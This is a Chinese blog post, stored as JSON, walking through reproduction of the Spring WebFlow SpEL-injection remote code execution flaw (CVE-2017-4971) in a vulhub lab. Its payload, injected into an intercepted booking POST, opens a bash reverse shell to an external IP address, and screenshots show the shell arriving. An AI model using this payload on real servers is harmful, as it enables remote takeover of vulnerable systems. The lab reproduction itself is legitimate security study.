{"title":"Spring WebFlow 远程代码执行漏洞（CVE-2017-4971）","uid":"8177e6fe27c9facc727b78285c09ddd1","slug":"Spring WebFlow 远程代码执行漏洞（CVE-2017-4971）","date":"2021-10-13T12:56:13.935Z","updated":"2021-10-13T12:58:25.082Z","comments":true,"path":"api/articles/Spring WebFlow 远程代码执行漏洞（CVE-2017-4971）.json","keywords":null,"cover":[],"content":"<h1 id=\"一、漏洞介绍\"><a href=\"#一、漏洞介绍\" class=\"headerlink\" title=\"一、漏洞介绍\"></a>一、漏洞介绍</h1><p>Spring WebFlow 是一个适用于开发基于流程的应用程序的框架（如购物逻辑），可以将流程的定义和实现流程行为的类和视图分离开来。在其 2.4.x 版本中，如果我们控制了数据绑定时的field，将导致一个SpEL表达式注入漏洞，最终造成任意命令执行。</p>\n<p>参考链接：</p>\n<ul>\n<li><p><a href=\"https://threathunter.org/topic/593d562353ab369c55425a90\">https://threathunter.org/topic/593d562353ab369c55425a90</a></p>\n</li>\n<li><p><a href=\"https://pivotal.io/security/cve-2017-4971\">https://pivotal.io/security/cve-2017-4971</a></p>\n</li>\n</ul>\n<h1 id=\"二、漏洞复现\"><a href=\"#二、漏洞复现\" class=\"headerlink\" title=\"二、漏洞复现\"></a>二、漏洞复现</h1><p>使用vulhub环境</p>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">cd /vulhub/spring/CVE-2017-4971 docker-compose up -d<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>首先访问<code>http://your-ip:8080/login</code>，用页面左边给出的任意一个账号/密码登录系统：</p>\n<p><img src=\"https://tcs.teambition.net/storage/312a1b8d3a34a777b8bffd32e3f19b57b4c4?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9hcHBJZCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9vcmdhbml6YXRpb25JZCI6IjVmNzE4MmIzODI1NWU3ZjU1MzkyOThjNiIsImV4cCI6MTYzNDEzMTUyMiwiaWF0IjoxNjM0MTI3OTIyLCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzMxMmExYjhkM2EzNGE3NzdiOGJmZmQzMmUzZjE5YjU3YjRjNCJ9.VuV7ZJ707H-Eboeb-Gz0918lVsfb0Oafi5WsidLiJTQ&download=image.png\"></p>\n<p>然后访问id为1的酒店<code>http://your-ip:8080/hotels/1</code>，点击预订按钮“Book Hotel”，填写相关信息后点击“Process”</p>\n<p><img src=\"https://tcs.teambition.net/storage/312a5f9b13d3b31945cfe7af738f3bffcdee?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9hcHBJZCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9vcmdhbml6YXRpb25JZCI6IjVmNzE4MmIzODI1NWU3ZjU1MzkyOThjNiIsImV4cCI6MTYzNDEzMTYwMywiaWF0IjoxNjM0MTI4MDAzLCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzMxMmE1ZjliMTNkM2IzMTk0NWNmZTdhZjczOGYzYmZmY2RlZSJ9.NzKodG-17vC_xk_IAiqdBV31KxHAhH3WPHbo3sPG1tQ&download=image.png\"></p>\n<p><img src=\"https://tcs.teambition.net/storage/312a96cb59241051b4292b5c727b68191bad?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9hcHBJZCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9vcmdhbml6YXRpb25JZCI6IjVmNzE4MmIzODI1NWU3ZjU1MzkyOThjNiIsImV4cCI6MTYzNDEzMTY3MiwiaWF0IjoxNjM0MTI4MDcyLCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzMxMmE5NmNiNTkyNDEwNTFiNDI5MmI1YzcyN2I2ODE5MWJhZCJ9.bRRqkLSatfWeqJYJ0wvDEpyA9X02gxdteI8DbeJlESU&download=image.png\"></p>\n<p>点击confirm的同时抓包</p>\n<p>抓到一个POST数据包，我们向其中添加一个字段（也就是反弹shell的POC）：</p>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">&amp;_(new+java.lang.ProcessBuilder(\"bash\",\"-c\",\"bash+-i+>%26+/dev/tcp/204.44.95.237/8888+0>%261\")).start()=vulhub<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>点击forward放包</p>\n<p><img src=\"https://tcs.teambition.net/storage/312a4bef8491db6566f921cff68b43949b9e?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9hcHBJZCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9vcmdhbml6YXRpb25JZCI6IjVmNzE4MmIzODI1NWU3ZjU1MzkyOThjNiIsImV4cCI6MTYzNDEzMzE5NCwiaWF0IjoxNjM0MTI5NTk0LCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzMxMmE0YmVmODQ5MWRiNjU2NmY5MjFjZmY2OGI0Mzk0OWI5ZSJ9.9MoFMMYc7oN32Hf5ariT0O6dBlFXZilyCsFHtT9EdQg&download=image.png\"></p>\n<p>VPS收到shell</p>\n<p><img src=\"https://tcs.teambition.net/storage/312a89967ac8cf95120bf6b746186497cce6?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9hcHBJZCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9vcmdhbml6YXRpb25JZCI6IjVmNzE4MmIzODI1NWU3ZjU1MzkyOThjNiIsImV4cCI6MTYzNDEzMzIxMywiaWF0IjoxNjM0MTI5NjEzLCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzMxMmE4OTk2N2FjOGNmOTUxMjBiZjZiNzQ2MTg2NDk3Y2NlNiJ9.sbWI7fkCOJvi1DbPjxWfHXGpO1HdlXiq5kU0xPuuDDY&download=image.png\"></p>\n","feature":true,"text":"一、漏洞介绍Spring WebFlow 是一个适用于开发基于流程的应用程序的框架（如购物逻辑），可以将流程的定义和实现流程行为的类和视图分离开来。在其 2.4.x 版本中，如果我们控制了数据绑定时的field，将导致一个SpEL表达式注入漏洞，最终造成任意命令执行。 参考链接：...","link":"","photos":[],"count_time":{"symbolsCount":645,"symbolsTime":"1 mins."},"categories":[{"name":"渗透测试","slug":"渗透测试","count":11,"path":"api/categories/渗透测试.json"}],"tags":[{"name":"渗透测试","slug":"渗透测试","count":11,"path":"api/tags/渗透测试.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E4%B8%80%E3%80%81%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D\"><span class=\"toc-text\">一、漏洞介绍</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0\"><span class=\"toc-text\">二、漏洞复现</span></a></li></ol>","author":{"name":"街溜子小王","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"默默学习的街溜子","socials":{"github":"https://github.com/ztohacker","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"XXE漏洞","uid":"f517cbae543576764284438e95f2dbcc","slug":"XXE漏洞","date":"2021-11-05T09:41:17.005Z","updated":"2021-11-05T09:44:32.770Z","comments":true,"path":"api/articles/XXE漏洞.json","keywords":null,"cover":[],"text":"一、漏洞描述XML 外部实体注入（XML External Entity）简称 XXE 漏洞，XML 用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML 文档结构包括 XML 声明、DTD 文档类型定义...","link":"","photos":[],"count_time":{"symbolsCount":"5.5k","symbolsTime":"5 mins."},"categories":[{"name":"渗透测试","slug":"渗透测试","count":11,"path":"api/categories/渗透测试.json"}],"tags":[{"name":"渗透测试","slug":"渗透测试","count":11,"path":"api/tags/渗透测试.json"}],"author":{"name":"街溜子小王","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"默默学习的街溜子","socials":{"github":"https://github.com/ztohacker","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"Spring Security OAuth2 远程命令执行漏洞（CVE-2016-4977） SpEL表达式 RCE","uid":"6567db906d267d45710c8c967afd05c5","slug":"Spring Security OAuth2 远程命令执行漏洞（CVE-2016-4977） SpEL表达式 RCE","date":"2021-10-13T12:56:13.931Z","updated":"2021-10-13T12:57:58.643Z","comments":true,"path":"api/articles/Spring Security OAuth2 远程命令执行漏洞（CVE-2016-4977） SpEL表达式 RCE.json","keywords":null,"cover":[],"text":"一、漏洞原理 spring boot 处理参数值出错，流程进入 org.springframework.util.PropertyPlaceholderHelper 类中 此时 URL 中的参数值会用 parseStringValue 方法进行递归解析 其中 $&#123;&#1...","link":"","photos":[],"count_time":{"symbolsCount":"2.1k","symbolsTime":"2 mins."},"categories":[{"name":"渗透测试","slug":"渗透测试","count":11,"path":"api/categories/渗透测试.json"}],"tags":[{"name":"渗透测试","slug":"渗透测试","count":11,"path":"api/tags/渗透测试.json"}],"author":{"name":"街溜子小王","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"默默学习的街溜子","socials":{"github":"https://github.com/ztohacker","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}